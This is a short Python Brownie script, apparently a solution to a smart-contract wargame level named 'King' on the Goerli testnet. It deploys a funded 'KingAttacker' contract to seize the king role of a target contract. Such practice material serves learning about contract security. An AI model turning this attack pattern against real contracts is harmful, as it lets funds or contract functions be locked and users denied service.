import brownie

from web3_hacking import config


def main():
    contract_address = "0x8E14DB6A02a73f6AA2b638Db34E30928b1ae5cd8"

    brownie.network.disconnect()
    brownie.network.connect("goerli")

    brownie.accounts.add(config.ETH_ACCOUNT_PRIVATE_KEY)

    king = brownie.King.at(contract_address)
    prize = king.prize()

    # Deploy KingAttacker
    king_attacker = brownie.KingAttacker.deploy(
        king.address, {"from": brownie.accounts[0], "value": prize}
    )

    # Claim King
    king_attacker.claimKing(prize)
